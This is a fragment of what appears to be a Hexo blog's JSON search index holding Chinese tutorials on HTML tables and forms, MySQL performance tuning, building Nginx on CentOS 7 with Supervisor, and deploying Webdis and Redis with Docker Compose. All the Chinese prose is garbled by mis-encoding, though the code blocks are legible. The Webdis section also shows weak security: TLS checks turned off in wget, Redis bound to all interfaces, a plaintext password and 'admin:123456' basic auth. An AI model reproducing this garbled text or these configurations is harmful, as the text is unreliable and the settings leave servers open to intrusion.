colspan="5"&gt;ä¸Šè¯¾&lt;/th&gt; &lt;th colspan="2"&gt;ä¼‘æ¯&lt;/th&gt; &lt;/tr&gt; &lt;tr align="center" bgcolor="#00BFFF"&gt; &lt;td&gt;æ˜ŸæœŸ&lt;/td&gt; &lt;td&gt;æ˜ŸæœŸä¸€&lt;/td&gt; &lt;td&gt;æ˜ŸæœŸäºŒ&lt;/td&gt; &lt;td&gt;æ˜ŸæœŸä¸‰&lt;/td&gt; &lt;td&gt;æ˜ŸæœŸå››&lt;/td&gt; &lt;td&gt;æ˜ŸæœŸäº”&lt;/td&gt; &lt;td&gt;æ˜ŸæœŸå…­&lt;/td&gt; &lt;td&gt;æ˜ŸæœŸæ—¥&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td rowspan="4"&gt;ä¸Šåˆ&lt;/td&gt; &lt;td&gt;è¯­æ–‡&lt;/td&gt; &lt;td&gt;æ•°å­¦&lt;/td&gt; &lt;td&gt;ä½“è‚²&lt;/td&gt; &lt;td&gt;ç”Ÿç†&lt;/td&gt; &lt;td&gt;æƒ…æ„Ÿ&lt;/td&gt; &lt;td&gt;ç”µç«&lt;/td&gt; &lt;td rowspan="4"&gt;ä¼‘æ¯&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td&gt;è¯­æ–‡&lt;/td&gt; &lt;td&gt;æ•°å­¦&lt;/td&gt; &lt;td&gt;ä½“è‚²&lt;/td&gt; &lt;td&gt;ç”Ÿç†&lt;/td&gt; &lt;td&gt;æƒ…æ„Ÿ&lt;/td&gt; &lt;td&gt;ç”µç«&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td&gt;è¯­æ–‡&lt;/td&gt; &lt;td&gt;æ•°å­¦&lt;/td&gt; &lt;td&gt;ä½“è‚²&lt;/td&gt; &lt;td&gt;ç”Ÿç†&lt;/td&gt; &lt;td&gt;æƒ…æ„Ÿ&lt;/td&gt; &lt;td&gt;ç”µç«&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td&gt;è¯­æ–‡&lt;/td&gt; &lt;td&gt;æ•°å­¦&lt;/td&gt; &lt;td&gt;ä½“è‚²&lt;/td&gt; &lt;td&gt;ç”Ÿç†&lt;/td&gt; &lt;td&gt;æƒ…æ„Ÿ&lt;/td&gt; &lt;td&gt;ç”µç«&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td rowspan="2"&gt;ä¸‹åˆ&lt;/td&gt; &lt;td&gt;è¯­æ–‡&lt;/td&gt; &lt;td&gt;æ•°å­¦&lt;/td&gt; &lt;td&gt;ä½“è‚²&lt;/td&gt; &lt;td&gt;ç”Ÿç†&lt;/td&gt; &lt;td&gt;æƒ…æ„Ÿ&lt;/td&gt; &lt;td&gt;ç”µç«&lt;/td&gt; &lt;td rowspan="4"&gt;ä¼‘æ¯&lt;/td&gt; &lt;/tr&gt; &lt;tr align="center"&gt; &lt;td&gt;è¯­æ–‡&lt;/td&gt; &lt;td&gt;æ•°å­¦&lt;/td&gt; &lt;td&gt;ä½“è‚²&lt;/td&gt; &lt;td&gt;ç”Ÿç†&lt;/td&gt; &lt;td&gt;æƒ…æ„Ÿ&lt;/td&gt; &lt;td&gt;ç”µç«&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; è¡¨å•è¡¨å•åŸºç¡€ è¡¨å•å®æˆ˜ â˜…å±•å¼€æ¡ˆä¾‹ä»£ç â˜… 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;è¡¨å•&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action="#" method="post"&gt; &lt;label for="name"&gt;å§“åï¼š&lt;/label&gt; &lt;input type="text" id="name" /&gt; &lt;br&gt;&lt;br&gt; &lt;label for="password"&gt;å¯†ç ï¼š&lt;/label&gt; &lt;input type="password" id="password" /&gt; &lt;br&gt;&lt;br&gt; æ€§åˆ«ï¼š &lt;input type="radio" name="gender" id="man" checked /&gt;&lt;label for="man"&gt;ç”·&lt;/label&gt; &lt;input type="radio" name="gender" id="female" /&gt;&lt;label for="female"&gt;å¥³&lt;/label&gt; &lt;br&gt;&lt;br&gt; å­¦å†ï¼š &lt;input type="radio" name="edu" id="edu-level-1" /&gt;&lt;label for="edu-level-1"&gt;ä¸­èŒ&lt;/label&gt; &lt;input type="radio" name="edu" id="edu-level-2" /&gt;&lt;label for="edu-level-2"&gt;å¤§ä¸“&lt;/label&gt; &lt;input type="radio" name="edu" id="edu-level-3" /&gt;&lt;label for="edu-level-3"&gt;æœ¬ç§‘&lt;/label&gt; &lt;input type="radio" name="edu" id="edu-level-4" /&gt;&lt;label for="edu-level-4"&gt;ç¡•å£«&lt;/label&gt; &lt;input type="radio" name="edu" id="edu-level-5" /&gt;&lt;label for="edu-level-5"&gt;åšå£«&lt;/label&gt; &lt;br&gt;&lt;br&gt; å›½ç±ï¼š &lt;select&gt; &lt;option value="0"&gt;æ³°å›½&lt;/option&gt; &lt;option value="1" selected&gt;ä¸­å›½&lt;/option&gt; &lt;option value="2"&gt;æ—¥æœ¬&lt;/option&gt; &lt;option value="3"&gt;éŸ©å›½&lt;/option&gt; &lt;option value="4"&gt;å°åº¦&lt;/option&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; å·¥ä½œå¹´é™ï¼š &lt;select&gt; &lt;optgroup label="åˆçº§"&gt; &lt;option value="1"&gt;1 å¹´&lt;/option&gt; &lt;option value="2"&gt;2 å¹´&lt;/option&gt; &lt;option value="3"&gt;3 å¹´&lt;/option&gt; &lt;/optgroup&gt; &lt;optgroup label="ä¸­çº§"&gt; &lt;option value="4"&gt;4 å¹´&lt;/option&gt; &lt;option value="5"&gt;5 å¹´&lt;/option&gt; &lt;option value="6"&gt;6 å¹´&lt;/option&gt; &lt;/optgroup&gt; &lt;optgroup label="é«˜çº§"&gt; &lt;option value="7"&gt;7 å¹´&lt;/option&gt; &lt;option value="8"&gt;8 å¹´&lt;/option&gt; &lt;option value="9"&gt;9 å¹´&lt;/option&gt; &lt;option value="10"&gt;10 å¹´&lt;/option&gt; &lt;/optgroup&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; å…´è¶£çˆ±å¥½ï¼š &lt;input type="checkbox" value="0" id="read"&gt;&lt;label for="read"&gt;é˜…è¯»&lt;/label&gt; &lt;input type="checkbox" value="2" id="sport"&gt;&lt;label for="sport"&gt;è¿åŠ¨&lt;/label&gt; &lt;input type="checkbox" value="3" id="music"&gt;&lt;label for="music"&gt;éŸ³ä¹&lt;/label&gt; &lt;br&gt;&lt;br&gt; &lt;label for="evaluate"&gt;è‡ªæˆ‘è¯„ä»·ï¼š&lt;/label&gt; &lt;br&gt; &lt;textarea id="evaluate" cols="50" rows="6"&gt;&lt;/textarea&gt; &lt;br&gt;&lt;br&gt; &lt;input type="submit" value="æäº¤"&gt;&lt;/button&gt; &lt;input type="reset" value="é‡ç½®"&gt;&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; ç‰¹æ®Šå­—ç¬¦ ä»£ç æ³¨é‡Š12&lt;!-- è¿™æ˜¯HTMLä»£ç çš„æ³¨é‡Š --&gt;&lt;img src="phone.jpg" width="800px" height="1000px"&gt; æœç´¢å¼•æ“ä¼˜åŒ–åˆ©ç”¨ &lt;meta&gt; æ ‡ç­¾å¯ä»¥è¿›è¡Œæœç´¢å¼•æ“ä¼˜åŒ–ï¼Œç¤ºä¾‹ HTML ä»£ç å¦‚ä¸‹ï¼š 12&lt;meta name="keywords" content="å‰ç«¯å¼€å‘"&gt;&lt;meta name="description" content="å‰ç«¯å…¥é—¨åŸºç¡€çš„ HTML ä¸ CSS çŸ¥è¯†ç‚¹ã€‚"&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å‰ç«¯"},{title:"MySQL æ€§èƒ½ä¼˜åŒ– - ç¬¬ä¸€ç¯‡",url:"/posts/b562d0a3.html",text:'æŸ¥è¯¢å„ç§ SQL çš„æ‰§è¡Œé¢‘ç‡è¯­æ³•ï¼šshow [session|global] status like â€˜% Com_%â€™; æŸ¥è¯¢ç¤ºä¾‹ï¼š 12345678# æŸ¥è¯¢å½“å‰æ•°æ®åº“æ‰§è¡ŒCRUDæ“ä½œçš„æ¬¡æ•°show global status like \'com_select\';show global status like \'com_insert\';show global status like \'com_update\';show global status like \'com_delete\';# æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„è¿æ¥æ•°show global status like \'connections\'; æ…¢æŸ¥è¯¢ä¼˜åŒ–å¯ç”¨è®°å½•æ…¢æŸ¥è¯¢æ—¥å¿—æ³¨æ„ï¼šé€šè¿‡ MySQL å‘½ä»¤æ¥ä¿®æ”¹æ…¢æŸ¥è¯¢ç›¸å…³å‚æ•°ï¼Œæ— è®ºä¿®æ”¹å…¨å±€è¿˜æ˜¯å½“å‰ä¼šè¯å†…çš„é…ç½®å‚æ•°ï¼Œåœ¨ MySQL é‡å¯ä¹‹åéƒ½ä¼šå¤±æ•ˆï¼Œæƒ³æ°¸ä¹…ç”Ÿæ•ˆå¿…é¡»ä¿®æ”¹ MySQL çš„é…ç½®æ–‡ä»¶ã€‚ 1234567891011121314151617# ä¿®æ”¹å½“å‰ä¼šè¯çš„æ…¢æŸ¥è¯¢å®šä¹‰æ—¶é—´set long_query_time = 1;# æˆ–è€…ä¿®æ”¹å…¨å±€é»˜è®¤çš„æ…¢æŸ¥è¯¢å®šä¹‰æ—¶é—´set global long_query_time = 1;# æŸ¥è¯¢æ˜¯å¦å¼€å¯äº†è®°å½•æ…¢æŸ¥è¯¢æ—¥å¿—show variables like \'%slow%\';# å¼€å¯è®°å½•æ…¢æŸ¥è¯¢æ—¥å¿—set global slow_query_log = on;# æŸ¥è¯¢æ…¢æŸ¥è¯¢å‘ç”Ÿçš„æ¬¡æ•°show status like \'slow_queries\';# æŸ¥è¯¢é»˜è®¤çš„æ…¢æŸ¥è¯¢å®šä¹‰æ—¶é—´show variables like \'long_query_time\'; æ°¸ä¹…å¯ç”¨è®°å½•æ…¢æŸ¥è¯¢æ—¥å¿—MySQL5.6 å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ my.cnf ä¸­æ·»åŠ ä»¥ä¸‹é…ç½®ã€‚ 12345678# æ…¢æŸ¥è¯¢æ—¶é—´long_query_time=1# æ˜¯å¦è®°å½•æ…¢æŸ¥è¯¢slow_query_log=TRUE# æ…¢æŸ¥è¯¢æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„slow_query_log_file=/var/log/mysqld-slow.log ç´¢å¼•ä¼˜åŒ–æ·»åŠ ã€åˆ é™¤ç´¢å¼•ç´¢å¼•çš„ç±»å‹åŒ…æ‹¬ä¸»é”®ç´¢å¼•ã€å”¯ä¸€ç´¢å¼•ã€æ™®é€šç´¢å¼•ã€å…¨æ–‡ç´¢å¼•ï¼Œæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯å¤åˆç´¢å¼• (å•ä¸ªç´¢å¼•ä½œç”¨åœ¨å¤šåˆ—ä¸Š)ï¼Œå…¶ä¸­ç´¢å¼•çš„æ·»åŠ ã€åˆ é™¤ã€ä½¿ç”¨ç‡æŸ¥è¯¢è¯­æ³•å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526# æŸ¥è¯¢æŸå¼ è¡¨çš„ç´¢å¼•ä¿¡æ¯show keys from table_xx;show index from table_xx;# æ·»åŠ ä¸»é”®ç´¢å¼•alter table table_xx add primary key(column_name);# æ·»åŠ æ™®é€šç´¢å¼•create index index_name on table_xx(column_name);alter table table_xx add index index_name(column_name);# æ·»åŠ å”¯ä¸€ç´¢å¼•ï¼Œå”¯ä¸€ç´¢å¼•æ‰€åœ¨çš„åˆ—å€¼å¯ä»¥ä¸ºNullï¼ŒåŒæ—¶å¯ä»¥å­˜åœ¨å¤šä¸ªNullå€¼create unique index index_name on table_xx(column_name);create table table_xx(id primary key auto_increment, name varchar(20) unique);# å…¨æ–‡ç´¢å¼•åªå¯¹MyIsamå­˜å‚¨å¼•æ“æœ‰æ•ˆï¼Œä¸”åªé’ˆå¯¹è‹±æ–‡ç”Ÿæ•ˆï¼›Mysqlä¸­å¯ä»¥ä½¿ç”¨sphinx(coreseek)æŠ€æœ¯å¤„ç†ä¸­æ–‡çš„å…¨æ–‡ç´¢å¼•ï¼Œæ­£ç¡®ä½¿ç”¨å…¨æ–‡ç´¢å¼•æŸ¥è¯¢çš„è¯­æ³•å¦‚ä¸‹ï¼Œå…¶ä¸­titleã€bodyå­—æ®µå­˜åœ¨å…¨æ–‡ç´¢å¼•select * from articles where match(title, body) against(\'tomcat\');# åˆ é™¤ç´¢å¼•(é€‚ç”¨äºå”¯ä¸€ç´¢å¼•ã€æ™®é€šç´¢å¼•ã€å…¨æ–‡ç´¢å¼•)alter table table_xx drop index index_name;# åˆ é™¤ä¸»é”®ç´¢å¼•alter table table_xx drop primary key;# æŸ¥çœ‹ç´¢å¼•çš„ä½¿ç”¨ç‡show status like \'Handler_read%\'; ç´¢å¼•çš„é€‚ç”¨åœºæ™¯12345678910# è¾ƒé¢‘ç¹çš„ä½œä¸ºæŸ¥è¯¢æ¡ä»¶å­—æ®µåº”è¯¥åˆ›å»ºç´¢å¼•select * from emp where empno = 1# å”¯ä¸€æ€§å¤ªå·®çš„å­—æ®µä¸é€‚åˆå•ç‹¬åˆ›å»ºç´¢å¼•ï¼Œå³ä½¿æ˜¯é¢‘ç¹ä½œä¸ºæŸ¥è¯¢æ¡ä»¶select * from emp where sex = \'ç”·\'# æ›´æ–°éå¸¸é¢‘ç¹çš„å­—æ®µä¸é€‚åˆåˆ›å»ºç´¢å¼•select * from emp where logincount = 1# ä¸ä¼šå‡ºç°åœ¨WHEREå­å¥ä¸­çš„å­—æ®µä¸è¯¥åˆ›å»ºç´¢å¼• ç´¢å¼•ä¸ç”Ÿæ•ˆçš„æƒ…å†µ å¯¹äºå¤šåˆ—ç´¢å¼•ï¼Œå¦‚æœä¸æ˜¯ä½¿ç”¨çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œåˆ™ä¸ä¼šä½¿ç”¨ç´¢å¼• å¦‚æœ MySQL ä¼°ç®—ä½¿ç”¨å…¨è¡¨æ‰«æè¦æ¯”ä½¿ç”¨ç´¢å¼•å¿«ï¼Œåˆ™ä¸ä¼šä½¿ç”¨ç´¢å¼• like æŸ¥è¯¢ï¼Œå³æ˜¯ä»¥ % å¼€å¤´çš„æŸ¥è¯¢ä¸ä¼šä½¿ç”¨ç´¢å¼•ï¼Œé™¤é select æ•°æ®åˆ—éƒ½åŠ äº†ç´¢å¼• å¦‚æœåˆ—ç±»å‹æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¸€å®šè¦åœ¨æ¡ä»¶ä¸­å°†æ•°æ®ä½¿ç”¨å•å¼•å·åŒ…èµ·æ¥ï¼Œå¦åˆ™ç´¢å¼•ä¸ç”Ÿæ•ˆ å¦‚æœæ¡ä»¶ä¸­æœ‰ orï¼Œå³ä½¿å…¶ä¸­æœ‰éƒ¨åˆ†æ¡ä»¶å¸¦ç´¢å¼•ä¹Ÿä¸ä¼šä½¿ç”¨ã€‚æ¢è¨€ä¹‹ï¼Œå¿…é¡»æ‰€æœ‰åˆ—éƒ½å»ºæœ‰ç´¢å¼•æ‰æœ‰æ•ˆ é”ä¼˜åŒ–æŸ¥è¯¢è¡¨çº§é”äº‰ç”¨æƒ…å†µ å…¶ä»–ä¼˜åŒ–group by ä¼˜åŒ–group by ä¹‹åé»˜è®¤ä¼šæ‰§è¡Œæ’åºæ“ä½œï¼Œå¯ä»¥ä½¿ç”¨ group by xxx order by null å¼ºåˆ¶ä¸è¿›è¡Œæ’åºæ“ä½œã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"æ•°æ®åº“"},{title:"Centos7 ç”Ÿäº§ç¯å¢ƒå®‰è£… Nginx",url:"/posts/9da397da.html",text:'ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux å®‰è£… Supervisor 12345678910111213# æç¤ºï¼šsupervisorä¸»è¦ç”¨äºç®¡ç†nginxçš„å¼€æœºè‡ªå¯åŠ¨ï¼ˆå¸¦å®ˆæŠ¤è¿›ç¨‹ï¼‰# å®‰è£…# yum install -y supervisor# å¼€æœºè‡ªå¯åŠ¨# systemctl enable supervisord# å¯åŠ¨æœåŠ¡# systemctl start supervisord# æŸ¥çœ‹æœåŠ¡çŠ¶æ€# systemctl status supervisord æ›´æ”¹ç³»ç»Ÿçš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•° æœ¬ç«™æ•™ç¨‹ åˆ›å»º Nginx ç”¨æˆ·å’Œç”¨æˆ·ç»„ 12345678# åˆ‡æ¢rootç”¨æˆ·$ sudo -i# åˆ›å»ºnginxç”¨æˆ·ç»„# groupadd nginx# åˆ›å»ºnginxç”¨æˆ·ï¼ˆä¸å…è®¸è¿œç¨‹ç™»å½•ï¼‰# useradd -g nginx nginx -s /bin/false ä¸‹è½½ Nginx 123456789# åˆ›å»ºä¸‹è½½ç›®å½•# mkdir -p /home/nginx/software# ä¸‹è½½# cd /home/nginx/software# wget http://nginx.org/download/nginx-1.16.0.tar.gz# è§£å‹# tar -xvf nginx-1.16.0.tar.gz ç¼–è¯‘å®‰è£… Nginx 123456789101112131415161718192021222324252627# è¿›å…¥ä¸‹è½½ç›®å½•# cd /home/nginx/software/nginx-1.16.0# å®‰è£…ä¾èµ–åº“# yum install -y gcc gdb strace gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel e2fsprogs patch e2fsprogs-devel krb5-devel libidn libidn-devel openldap-devel nss_ldap openldap-clients openldap-servers libevent-devel libevent uuid-devel uuid openssl openssl-devel pcre pcre-devel# é…ç½®./configure \\ --user=nginx \\ --group=nginx \\ --prefix=/usr/local/nginx \\ --with-pcre \\ --with-http_v2_module \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module# ç¼–è¯‘å®‰è£…# make &amp;&amp; make install# å¤‡ä»½é»˜è®¤çš„é…ç½®æ–‡ä»¶# cd /usr/local/nginx/conf# cp nginx.conf nginx.conf.default# æ–‡ä»¶æˆæƒ# chown -R nginx:nginx /usr/local/nginx é…ç½® Nginx 1234567# ç¼–è¾‘nginxçš„é…ç½®æ–‡ä»¶# vim /usr/local/nginx/conf/nginx.confworker_processes 4;error_log logs/error.log;# æ ¡éªŒé…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®# /usr/local/nginx/sbin/nginx -t å¼€æœºè‡ªå¯åŠ¨ Nginx 1234567891011121314151617181920212223242526272829303132# åˆ›å»ºnginxçš„supervistoré…ç½®æ–‡ä»¶# touch /etc/supervisord.d/nginx.ini# ç¼–è¾‘nginxçš„supervistoré…ç½®æ–‡ä»¶# vim /etc/supervisord.d/nginx.ini[program:nginx]directory=/usr/local/nginxcommand=/usr/local/nginx/sbin/nginx -g \'daemon off;\' -c /usr/local/nginx/conf/nginx.confuser=rootnumprocs=1autostart=trueautorestart=truestartretries=10process_name=%(program_name)sstdout_logfile_backups=5stdout_logfile_maxbytes=10MBstdout_logfile=/var/log/supervisor/nginx.logstderr_logfile_backups=5stderr_logfile_maxbytes=10MBstderr_logfile=/var/log/supervisor/nginx-error.log# ä¸Šé¢çš„é…ç½®ï¼Œä¸»è¿›ç¨‹ä¼šä»¥rootç”¨æˆ·è¿è¡Œï¼Œworkerè¿›ç¨‹ä¼šä»¥nginxç”¨æˆ·è¿è¡Œ# é‡è½½nginxçš„supervistoré…ç½®æ–‡ä»¶ï¼Œä¼šè‡ªåŠ¨å¯åŠ¨nginxæœåŠ¡# supervisorctl reload# æŸ¥çœ‹nginxçš„è¿è¡ŒçŠ¶æ€# supervisorctl status nginxnginx RUNNING pid 9451, uptime 0:00:56 #å¦‚æœè¾“å‡ºæ­¤æ—¥å¿—ä¿¡æ¯ï¼Œè¯´æ˜nginxå¯åŠ¨æˆåŠŸï¼Œå¦åˆ™æŸ¥çœ‹nginxçš„å¯åŠ¨æ—¥å¿—æ¥æ’æŸ¥é—®é¢˜# æµ‹è¯•è®¿é—®nginx# curl -I -X GET 127.0.0.1:80 é…ç½®é˜²ç«å¢™ 12345678# å¼€æ”¾ç«¯å£# firewall-cmd --zone=public --permanent --add-port=80/tcp# ä¿å­˜é˜²ç«å¢™é…ç½®# firewall-cmd --reload# æŸ¥çœ‹å·²å¼€æ”¾çš„ç«¯å£# firewall-cmd --list-ports ç®¡ç† Nginx æœåŠ¡ 1234567891011121314# å…³é—­# supervisorctl stop nginx# å¯åŠ¨# supervisorctl start nginx# é‡å¯# supervisorctl restart nginx# æŸ¥çœ‹çŠ¶æ€# supervisorctl status nginx# å¹³æ»‘æ›´æ–°nginxçš„é…ç½®æ–‡ä»¶# /usr/local/nginx/sbin/nginx -s reload Nginx é…ç½®æ¦‚è¿° 12345å®‰è£…ç›®å½•ï¼š/usr/local/nginxé…ç½®æ–‡ä»¶ï¼š/usr/local/nginx/conf/nginx.confé”™è¯¯æ—¥å¿—ï¼š/usr/local/nginx/logs/error.logè®¿é—®æ—¥å¿—ï¼š/usr/local/nginx/logs/access.lognginxçš„supervistoré…ç½®æ–‡ä»¶ï¼š/etc/supervisord.d/nginx.ini var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"webæœåŠ¡å™¨ centos"},{title:"Docker å®‰è£… Webdis",url:"/posts/c87853c9.html",text:'å‰è¨€ Webdis æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„ Web æœåŠ¡å™¨ï¼Œä¸“é—¨ä¸º Redis æä¾› HTTP æ¥å£ï¼Œä½¿ç”¨ hiredisã€janssonã€libeventã€http-parser ç­‰ç»„ä»¶ã€‚ä¸‹é¢å°†ä»‹ç» Docker å®‰è£…éƒ¨ç½² Webdis ä¸ Redisï¼Œç”±äºç¯‡å¹…æœ‰é™ä¸ä¼šè¯¦ç»†ä»‹ç»éƒ¨ç½²è¿‡ç¨‹ï¼Œä½†ä¼šç»™å‡º Docker ç›¸å…³çš„ä¸»è¦é…ç½®å†…å®¹ã€‚å¦‚éœ€æ›´è¯¦ç»†çš„æ•™ç¨‹å†…å®¹ï¼Œå¯å‚è€ƒ Webdis Github ä¸Šçš„è¯´æ˜æ–‡æ¡£ã€‚ è½¯ä»¶ç¯å¢ƒ ç¯å¢ƒåç§° ç‰ˆæœ¬ docker-ce 18.09.3 docker-compose 1.24.0-rc1 linux å‘è¡Œç‰ˆ CentOS Linux release 7.6.1810 (Core) Webdis é•œåƒçš„ DockerFile 12345678910111213141516171819202122232425262728from debian:stretchMAINTAINER clay&lt;clay@gmail.com&gt;RUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install apt-utils vim net-tools telnet git curl wget make gcc libevent-devRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveENV version 0.1.4WORKDIR /usr/localRUN wget --no-check-certificate https://github.com/nicolasff/webdis/archive/$version.tar.gz -O webdis-$version.tar.gzRUN tar -xvzf webdis-$version.tar.gzRUN cd webdis-$version &amp;&amp; make &amp;&amp; make install &amp;&amp; cd ..RUN rm -rf webdis-$version.tag.gzWORKDIR /usr/local/webdis-$versionEXPOSE 7379CMD /usr/local/bin/webdis /etc/webdis.prod.json &amp;&amp; bash æ„å»º Webdis é•œåƒ 12345678# åˆ›å»ºDockerFile# touch Dockerfile-Webdis# å°†ä¸Šè¿°å†…å®¹å†™å…¥åˆ°DockerFileä¸­# vim Dockerfile-Webdis# æ„å»ºWebdisé•œåƒ# docker build -f Dockerfile-Webdis -t clay/webdis:0.1.4 . Redis çš„é…ç½®æ–‡ä»¶ Redis é…ç½®æ–‡ä»¶ä¸­çš„ä¸»è¦å†…å®¹ï¼ˆredis.confï¼‰å¦‚ä¸‹ï¼š 12345# æ³¨é‡Šæ‰ä¸‹é¢è¿™ä¸€è¡Œï¼Œä¸ç»‘å®šä»»ä½•ä¸»æœºIP# bind 127.0.0.1# è®¾ç½®Rediså¯†ç requirepass C6v8TMQv@oc%4HkznfKJ5jy&amp;zBUencAL Webdis çš„é…ç½®æ–‡ä»¶ Webdis é…ç½®æ–‡ä»¶ï¼ˆwebdis.prod.jsonï¼‰çš„å®Œæ•´å†…å®¹å¦‚ä¸‹ï¼Œå…·ä½“çš„ ACL è§„åˆ™å¯å‚è€ƒ Github ä¸Šçš„è¯´æ˜æ–‡æ¡£ã€‚è€ƒè™‘åˆ°æœåŠ¡å™¨å®‰å…¨ï¼Œä¸‹é¢é…ç½®äº† Http Auth çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ 1234567891011121314151617181920212223242526{ "redis_host": "172.89.0.2", "redis_port": 6379, "redis_auth": "C6v8TMQv@oc%4HkznfKJ5jy&amp;zBUencAL", "http_host": "0.0.0.0", "http_port": 7379, "threads": 4, "daemonize": false, "database": 0, "acl": [ { "disabled": ["DEBUG", "FLUSHDB", "FLUSHALL", "GET", "SET", "DEL"] }, { "http_basic_auth": "admin:123456", "enabled": ["DEBUG", "GET", "SET", "DEL"] } ], "verbosity": 3, "logfile": "/var/log/webdis.log"} Docker-Compose çš„é…ç½®æ–‡ä»¶ ä½¿ç”¨ Docker-Compose ç®¡ç†å®¹å™¨ï¼Œå…¶ä¸­ docker-compose.yml é…ç½®æ–‡ä»¶çš„å®Œæ•´å†…å®¹å¦‚ä¸‹ï¼ˆåŒ…æ‹¬ Redisã€Webdisï¼‰ã€‚å…·ä½“çš„æ•°æ®å·æŒ‚è½½ç›®å½•ï¼Œéœ€è¦æ ¹æ®è‡ªå·±çš„å®é™…æƒ…å†µè¿›è¡Œä¿®æ”¹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839version: "3.5"services: redis: image: redis:5.0.4-stretch container_name: redis-5.0.4 privileged: false ports: - 6379:6379 networks: redis-network: ipv4_address: 172.89.0.2 volumes: - \'/container/redis/data:/data\' - \'/container/redis/redis.conf:/usr/local/etc/redis/redis.conf\' command: redis-server /usr/local/etc/redis/redis.conf webdis: image: clay/webdis:0.1.4 container_name: webdis privileged: false depends_on: - redis networks: redis-network: ipv4_address: 172.89.0.3 ports: - 7379:7379 volumes: - \'/container/wedis/webdis.log:/var/log/webdis.log\' - \'/container/wedis/webdis.prod.json:/etc/webdis.prod.json\'networks: redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 åˆ›å»ºå¹¶å¯åŠ¨ Docker å®¹å™¨ 1234567891011# è¿›å…¥docker-compose.ymlé…ç½®æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•# cd docker-compose-dir# ä»¥åå°æ–¹å¼å¯åŠ¨Redisã€Webdiså®¹å™¨# docker-compose up -d# 